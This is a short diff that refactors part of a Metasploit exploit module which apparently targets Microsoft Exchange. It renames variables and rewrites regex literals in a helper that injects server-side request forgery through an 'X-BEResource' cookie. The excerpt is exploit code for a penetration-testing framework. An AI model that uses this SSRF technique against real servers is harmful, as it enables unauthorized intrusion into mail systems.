@@ -194,9 +194,9 @@ class MetasploitModule < Msf::Exploit::Remote
     )
 
     case response.body
-    when /<ErrorCode>500<\/ErrorCode>/
+    when %r{<ErrorCode>500</ErrorCode>}
       fail_with(Failure::NotFound, 'No Autodiscover information was found')
-    when /<Action>redirectAddr<\/Action>/
+    when %r{<Action>redirectAddr</Action>}
       fail_with(Failure::NotFound, 'No email address was found')
     end
 
@@ -398,25 +398,25 @@ class MetasploitModule < Msf::Exploit::Remote
     return [sid, session, canary, oab_id]
   end
 
-  def send_http(method, ssrf, _opt = {})
+  def send_http(method, ssrf, opts = {})
     ssrf = "X-BEResource=#{ssrf};"
-    if _opt[:cookie] && !_opt[:cookie].empty?
-      _opt[:cookie] = "#{ssrf} #{_opt[:cookie]}"
+    if opts[:cookie] && !opts[:cookie].empty?
+      opts[:cookie] = "#{ssrf} #{opts[:cookie]}"
     else
-      _opt[:cookie] = ssrf.to_s
+      opts[:cookie] = ssrf.to_s
     end
 
-    _opt[:ctype] = 'application/x-www-form-urlencoded' if _opt[:ctype].nil?
+    opts[:ctype] = 'application/x-www-form-urlencoded' if opts[:ctype].nil?
 
     request = {
       'method' => method,
       'uri' => @random_uri,
       'agent' => datastore['UserAgent'],
-      'ctype' => _opt[:ctype]
+      'ctype' => opts[:ctype]
     }
-    request = request.merge({ 'data' => _opt[:data] }) unless _opt[:data].nil?
-    request = request.merge({ 'cookie' => _opt[:cookie] }) unless _opt[:cookie].nil?
-    request = request.merge({ 'headers' => _opt[:headers] }) unless _opt[:headers].nil?
+    request = request.merge({ 'data' => opts[:data] }) unless opts[:data].nil?
+    request = request.merge({ 'cookie' => opts[:cookie] }) unless opts[:cookie].nil?
+    request = request.merge({ 'headers' => opts[:headers] }) unless opts[:headers].nil?
 
     received = send_request_cgi(request)
     fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received
